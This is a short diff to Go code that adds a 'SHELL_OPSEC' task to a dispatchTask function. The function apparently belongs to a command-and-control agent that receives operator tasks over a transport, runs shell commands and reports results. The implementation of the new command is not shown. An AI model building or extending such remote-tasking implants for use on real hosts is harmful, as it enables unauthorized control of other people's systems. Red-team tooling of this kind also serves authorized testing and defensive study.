@@ -209,6 +209,9 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, output, errStr)
 
+	case "SHELL_OPSEC":
+		t.sendResult(task.ID, runShellOpsec(task.Args), "")
+
 	case "SLEEP":
 		var args struct {
 			Sec    int `json:"sec"`
